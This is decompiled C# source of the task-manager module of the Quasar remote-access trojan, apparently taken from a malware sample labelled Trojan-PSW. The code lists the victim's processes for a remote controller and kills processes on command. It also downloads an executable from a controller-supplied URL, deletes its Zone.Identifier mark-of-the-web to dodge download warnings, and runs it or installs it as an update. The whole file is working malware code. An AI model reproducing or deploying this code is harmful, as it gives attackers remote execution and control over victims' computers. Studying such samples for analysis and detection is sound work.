// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.TaskManagerHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace Quasar.Client.Messages
{
  public class TaskManagerHandler : IMessageProcessor, IDisposable
  {
    private readonly QuasarClient _client;
    private readonly WebClient _webClient;

    public TaskManagerHandler(QuasarClient client)
    {
      this._client = client;
      this._client.ClientState += new Quasar.Client.Networking.Client.ClientStateEventHandler(this.OnClientStateChange);
      this._webClient = new WebClient()
      {
        Proxy = (IWebProxy) null
      };
      this._webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.OnDownloadFileCompleted);
    }

    private void OnClientStateChange(Quasar.Client.Networking.Client s, bool connected)
    {
      if (connected || !this._webClient.IsBusy)
        return;
      this._webClient.CancelAsync();
    }

    public bool CanExecute(IMessage message)
    {
      switch (message)
      {
        case GetProcesses _:
        case DoProcessStart _:
          return true;
        default:
          return message is DoProcessEnd;
      }
    }

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      switch (message)
      {
        case GetProcesses message1:
          this.Execute(sender, message1);
          break;
        case DoProcessStart message2:
          this.Execute(sender, message2);
          break;
        case DoProcessEnd message3:
          this.Execute(sender, message3);
          break;
      }
    }

    private void Execute(ISender client, GetProcesses message)
    {
      System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
      Quasar.Common.Models.Process[] processArray = new Quasar.Common.Models.Process[processes.Length];
      for (int index = 0; index < processes.Length; ++index)
      {
        Quasar.Common.Models.Process process = new Quasar.Common.Models.Process()
        {
          Name = processes[index].ProcessName + ".exe",
          Id = processes[index].Id,
          MainWindowTitle = processes[index].MainWindowTitle
        };
        processArray[index] = process;
      }
      client.Send<GetProcessesResponse>(new GetProcessesResponse()
      {
        Processes = processArray
      });
    }

    private void Execute(ISender client, DoProcessStart message)
    {
      if (string.IsNullOrEmpty(message.FilePath))
      {
        if (string.IsNullOrEmpty(message.DownloadUrl))
        {
          client.Send<DoProcessResponse>(new DoProcessResponse()
          {
            Action = ProcessAction.Start,
            Result = false
          });
        }
        else
        {
          message.FilePath = FileHelper.GetTempFilePath(".exe");
          try
          {
            if (this._webClient.IsBusy)
            {
              this._webClient.CancelAsync();
              while (this._webClient.IsBusy)
                Thread.Sleep(50);
            }
            this._webClient.DownloadFileAsync(new Uri(message.DownloadUrl), message.FilePath, (object) message);
          }
          catch
          {
            client.Send<DoProcessResponse>(new DoProcessResponse()
            {
              Action = ProcessAction.Start,
              Result = false
            });
            NativeMethods.DeleteFile(message.FilePath);
          }
        }
      }
      else
        this.ExecuteProcess(message.FilePath, message.IsUpdate);
    }

    private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
    {
      DoProcessStart userState = (DoProcessStart) e.UserState;
      if (e.Cancelled)
      {
        NativeMethods.DeleteFile(userState.FilePath);
      }
      else
      {
        FileHelper.DeleteZoneIdentifier(userState.FilePath);
        this.ExecuteProcess(userState.FilePath, userState.IsUpdate);
      }
    }

    private void ExecuteProcess(string filePath, bool isUpdate)
    {
      if (isUpdate)
      {
        try
        {
          new ClientUpdater().Update(filePath);
          this._client.Exit();
        }
        catch (Exception ex)
        {
          NativeMethods.DeleteFile(filePath);
          this._client.Send<SetStatus>(new SetStatus()
          {
            Message = "Update failed: " + ex.Message
          });
        }
      }
      else
      {
        try
        {
          System.Diagnostics.Process.Start(new ProcessStartInfo()
          {
            UseShellExecute = true,
            FileName = filePath
          });
          this._client.Send<DoProcessResponse>(new DoProcessResponse()
          {
            Action = ProcessAction.Start,
            Result = true
          });
        }
        catch (Exception ex)
        {
          this._client.Send<DoProcessResponse>(new DoProcessResponse()
          {
            Action = ProcessAction.Start,
            Result = false
          });
        }
      }
    }

    private void Execute(ISender client, DoProcessEnd message)
    {
      try
      {
        System.Diagnostics.Process.GetProcessById(message.Pid).Kill();
        client.Send<DoProcessResponse>(new DoProcessResponse()
        {
          Action = ProcessAction.End,
          Result = true
        });
      }
      catch
      {
        client.Send<DoProcessResponse>(new DoProcessResponse()
        {
          Action = ProcessAction.End,
          Result = false
        });
      }
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      this._client.ClientState -= new Quasar.Client.Networking.Client.ClientStateEventHandler(this.OnClientStateChange);
      this._webClient.DownloadFileCompleted -= new AsyncCompletedEventHandler(this.OnDownloadFileCompleted);
      this._webClient.CancelAsync();
      this._webClient.Dispose();
    }
  }
}
